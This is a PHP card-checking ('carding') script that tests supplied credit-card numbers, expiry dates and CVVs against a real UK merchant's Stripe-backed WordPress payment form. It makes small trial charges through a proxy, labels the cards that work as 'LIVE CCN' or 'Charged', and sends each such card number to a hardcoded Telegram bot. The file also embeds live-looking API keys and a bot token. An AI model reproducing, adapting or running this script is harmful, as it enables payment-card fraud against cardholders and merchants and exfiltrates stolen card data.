<?php
include(__DIR__."/Phppot/function.php");
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
$GATE = "BRAINTREE AUTHORISE";
extract($_GET);
//lista = "4745034023080410|04|2024|000";
$separator = explode("|", $lista);
$cc = $separator[0];

$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);
$binlist = json_decode(fbanklist($bin),true);
$ccbank = $binlist['Bank'];
$ccvendor = $binlist['Vendor'];
$cctype = $binlist['Bank_Info'];
$cc_country = $binlist['Country'];
$abn = $binlist['Abn'];
$cc_emoji = $binlist['emoji'];

$info = json_decode(random_info(),true);
$fname = $info['fname'];
$lname = $info['lname'];
$email = $info['email']; 
$street = $info['street'];
$city = $info['city'];
$state = $info['state'];
$phone = $info['phone'];
$postcode = $info['postcode'];

$pkey = "pk_live_udpshOfHBSR2drDzowBtGn4C";
$tokens = "aec3ac9f2368f7cda73c59de355e6d26";
$prod_id = "3482";
$amnt = 1;
$curr = "USD";
$ua = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36";
$referrer = "https://olivo.co.uk/asp-payment-box/?product_id=3482";
$site  = "https://olivo.co.uk/wp-admin/admin-ajax.php";
$tries = $tries + 1;
$cookie = RandomString();
$str = substr(randomString(), 0, 7);

  $page =  cURL(
    "$referrer",
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        "$ua"
    ],
    "",
    "GET",
    1,
    $cookie
); 
$confirm = GetStr($page, '"asp_pp_ajax_nonce":"', '"');
$create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

 $get_id =  cURL(
    "https://m.stripe.com/6",
    $headers = [
        'accept: */*',
        'content-type: text/plain;charset=UTF-8',
        'origin: https://m.stripe.network',
        'referrer: https://m.stripe.network/',
        "$ua"
    ],
    "",
    "POST",
    1,
    $cookie
);
$muid =  GetStr($get_id, '"muid":"', '"');
$guid = GetStr($get_id, '"guid":"', '"');
$sid = GetStr($get_id, '"sid":"', '"');
if (empty($guid)) {
    $guid = "N/A";
}
if (empty($muid)) {
    $muid = "N/A";
}
if (empty($sid)) {
    $sid = "N/A";
}
 $getPI =  cURL(
    "$site",
    $headers = [
        "accept: */*",
        "content-type: application/x-www-form-urlencoded",
        "referrer: $referrer",
        "$ua"
    ],
    'action=asp_pp_create_pi&amount=100&curr=USD&product_id='.$prod_id.'&quantity=1&billing_details={"name":"'.$str.' '.$str.'","email":"'.$str.'@gmail.com"}&token='.$tokens,
    "POST",
    1,
    $cookie 
);$pi_id = GetStr($getPI, '"pi_id":"', '"');$secret = GetStr($getPI, '"clientSecret":"', '"');


  $token_method =  cURL_ProxyOn(
    "https://api.stripe.com/v1/tokens",
    $headers = [
        "accept: */*",
        "content-type: application/x-www-form-urlencoded",
        "referrer: $referrer",
        "$ua"
    ],
    "card[name]=$str+$str&card[number]=$cc&card[cvc]=&card[exp_month]=$mm&card[exp_year]=$yy1&key=$pkey&pasted_fields=number",
    "POST",
    1,
    $cookie
);
//
$token = GetStr($token_method, '"id": "', '"');
if (strpos($token_method, '"id": "tok_')) {

  echo $execute =  cURL_ProxyOn(
       "$site",
       $headers = [
           "accept: */*",
           "content-type: application/x-www-form-urlencoded",
           "sec-fetch-site: same-origin",
           "referrer: $referrer",
           "$ua"
       ],
       'action=asp_pp_confirm_pi&product_id='.$prod_id.'&pi_id='.$pi_id.'&token='.$tokens.'&opts={"save_payment_method":true,"setup_future_usage":"off_session","payment_method_data":{"type":"card","card":{"token":"'.$token.'"}}}',
       "POST",
       1,
       $cookie
   );
//
//    $rdr = GetStr($execute, '"redirect_to":"', '"');
//    $secret = GetStr($execute, '&payment_intent_client_secret=', '&');$srcs = GetStr($execute, '&source=', '"');

//      $execute =  cURL(
//        "https://api.stripe.com/v1/3ds2/authenticate",
//        $headers = [
//            "accept: */*",
//            "content-type: application/x-www-form-urlencoded",
//            "sec-fetch-site: same-origin",
//            "referrer: $referrer",
//            "$ua"
//        ],
//        "source=$srcs&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3A%2203%22%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%221080%22%2C%22browserScreenWidth%22%3A%221920%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F103.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=true&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=false&key=$pkey",
//        "POST",
//        1,
//        $cookie
//    );
//
//    $execute =  cURL(
//        "https://api.stripe.com/v1/payment_intents/$pi_id?key=$pkey&_stripe_version=2020-03-02&is_stripe_sdk=false&client_secret=$secret",
//        $headers = [
//            "accept: application/json",
//            "content-type: application/x-www-form-urlencoded",
//            "origin: https://js.stripe.com",
//            "referrer: https://js.stripe.com/",
//            "$ua"
//        ],
//        '',
//        "GET",
//        1,
//        $cookie
//    );
//       $execute =  cURL(
//        "$site",
//        $headers = [
//            "accept: */*",
//            "content-type: application/x-www-form-urlencoded",
//            "sec-fetch-site: same-origin",
//            "referrer: $referrer",
//            "$ua"
//        ],
//        'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id='.$prod_id.'&pi_id='.$pi_id.'&token='.$tokens.'&opts={"receipt_email":"'.$email.'"}',
//        "POST",
//        1,
//        $cookie
//    );
    // $ips = GetStr($token_method, '"client_ip": "', '"');
    $response = GetStr($execute, '"err":"Stripe API error occurred: ','"');
   // $dcode = GetStr($execute, '"code": "','"');
    // $tds = GetStr($execute, '"type": "','"');
}else{
   $response = GetStr($token_method, '"err":"Stripe API error occurred: ','"');
}                ###END OF CHECKER PART###



if (strpos($execute, '"pi_id"')){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
   file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - STRPE GATE');
}elseif (strpos($execute, 'security code is incorrect')){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
   file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' AUTHORISE CCN - STRPE GATE');
}elseif(strpos($execute, '"err":"') || $response == 'Your card was declined.' || strpos($execute, '"type": "card_error"')){
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill"> "MESSAGE": "'.urldecode($response).'" - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": '.$execute.urldecode($response).' - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}

